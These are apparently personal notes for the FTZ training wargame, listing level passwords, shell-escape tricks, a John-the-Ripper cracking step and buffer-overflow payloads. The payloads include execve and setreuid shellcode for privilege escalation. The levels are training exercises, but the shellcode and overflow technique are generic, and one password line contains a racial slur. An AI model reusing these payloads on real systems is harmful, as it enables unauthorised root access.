[FTZ] 
ssh -oKexAlgorithms=+diffie-hellman-group1-sha1 -c aes128-cbc trainer3@192.168.171.2

LEVEL2: vi => :sh
pwd: can you fly?

LEVEL3: ;/bin/sh;
pwd: suck my brain

LEVEL4: backdoor.c 파일 (system(“my-pass”) 실행) -> 
backdoor 실행 파일 생성 -> finger level4@localhost
pwd: what is your name?

LEVEL5: level5.tmp.c 파일 (system(“my-pass”) 실행) -> level.tmp 실행 파일 생성 -> /usr/bin/level5 실행 -> cat /tmp/level5.tmp
pwd: what the hell

LEVEL6: 힌트 나오고 바로 Ctrl + C 
pwd; come together

LEVEL7: wrong.txt 없음 

LEVEL8: 
1.	find / -size 2700c 2> /dev/null 
2.	cat /etc/rc.d/found.txt
3.	Use John cracking (John passwd) 
pwd: apple

LEVEL9: (python -c 'print("go" * 20)'; cat) | /usr/bin/bof ;
pwd: interesting to hack!

LEVEL10: level10_exploit.c 
pwd: what!@#$?
 
LEVEL11: ./attackme `python -c 'print "\x90" * 268 + "\xe0\xfc\xff\xbf"+"\x90" * 20000 + "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x89\xc2\xb0\x0b\xcd\x80"'`
pwd: it is like this

무한 루프: while [ 1 ] ; do _______; done
=> \xe0\xdb\xff\xbf

LEVEL12: (python -c ‘print “A” * 268 + “환경변수 저장 주소”’;cat) | ./attackme 

pwd: have no clue

export SHELLCODE=`python -c 'print "\x90" * 15 + "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x89\xc2\xb0\x0b\xcd\x80"'`

exploit.c 
#include <stido.h>
#include <stdlib.h>

int main(void) { 
	printf(“0x%x\n”, getenv(“SHELLCODE”));
}

LEVEL13: `python -c 'print "A" * 1036 + "\x67\x45\x23\x01" + "A" * 12 + "환경변수 저장 주소"'`
pwd: what that nigga want?

LEVEL14: (python -c 'print "A" * 40 + "\xef\xbe\xad\xde"' ; cat) | ./attackme
pwd: guess what

0x38 -> 56 
0xfffffff0 -> ebp- 16
buf(20) + Dummy (20) +  check(4) 

LEVEL15: (python -c 'print "A" * 40 + "\xb2\x84\x04\x08"';cat) | ./attackme 
pwd: about to cause mass
0xdeadbeef 값을 가지고 있는 주소를 가리키도록 

LEVEL16: (python -c 'print "A" * 40 + "\xd0\x84\x04\x08"'; cat) | ./attackme
pwd: king poetic

0x38 = 56 
ebp -16: 56 - 16 = 40 ( 41번째에 shell address 넣으면 됨) 
0x080484d0 => shell function address  
0x08048500 => printit function address 

LEVEL17: (python -c 'print "A" * 40 + "\xb7\xfd\xff\xbf"'; cat) | ./attackme
pwd: why did you do it
환경변수 활용 

LEVEL18: (python -c 'print "\x08" * 4 + "\xef\xbe\xad\xde"'; cat) | ./attackme
pwd: swimming in pink

LEVEL19: (python -c 'print "A" * 44 + "\xa9\xfd\xff\xbf"';cat) | ./attackme
pwd: we are just regular guys
setreuid + SHELLCODE
setreuid 쉘 코드 만들기 
우선 level20으로 가는 아이디 값 찾기 (cat /etc/passwd)
/usr/include/asm/unistd.h -> syscall 번호 찾기 


.global main

main:
        #setreuid(3100,3100)
        xor     %eax, %eax
        mov     $0x46, %al  # 70 setreuid syscall
        mov     $0xc1c, %bx # 3100
        mov     $0xc1c, %cx # 3100
        int     $0x80

objdump -d setreuid | grep -A5 “main”
(Setreuid SHELLCODE)
=> \x31\xc0\xb0\x46\x66\xbb\x1c\x0c\x66\xb9\x1c\x0c\xcd\x80


setreuid + SHELLCODE 환경변수 지정

export SHELLCODE=`python -c 'print "\x90" * 15 + "\x31\xc0\xb0\x46\x66\xbb\x1c\x0c\x66\xb9\x1c\x0c\xcd\x80\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x89\xc2\xb0\x0b\xcd\x80"'`

LEVEL20: 


